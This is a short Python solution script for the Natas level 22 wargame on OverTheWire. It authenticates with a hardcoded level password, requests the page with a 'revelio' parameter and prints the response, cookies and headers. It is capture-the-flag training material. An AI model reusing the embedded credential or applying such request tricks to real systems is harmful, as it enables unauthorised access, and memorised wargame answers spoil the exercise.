import sys
import requests as req

username = "natas22"
password = "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"
url = "http://%s.natas.labs.overthewire.org/" % username

data = {"revelio": ""}
s = req.session()

r = s.get(url, auth=(username, password))
r = s.get(url, auth=(username, password), params=data)
print(r.text)
print(r.cookies)
print(r.headers)
print(s.proxies)
